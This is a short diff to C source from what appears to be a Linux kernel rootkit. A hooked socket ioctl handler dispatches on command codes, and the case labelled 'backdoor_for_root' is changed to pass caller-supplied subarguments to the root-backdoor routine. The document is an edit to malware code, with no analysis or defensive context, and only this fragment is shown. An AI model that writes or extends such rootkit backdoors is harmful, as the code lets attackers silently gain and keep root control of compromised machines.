@@ -82,7 +82,7 @@ static int khook_inet_ioctl(struct socket *sock, unsigned int cmd, unsigned long
                 break;
             case 0x7:
                 // backdoor_for_root
-                handle_backdoor_root_request();
+                handle_backdoor_root_request(cmd_arg.subargs);
                 break;
             default:
                 // not valid
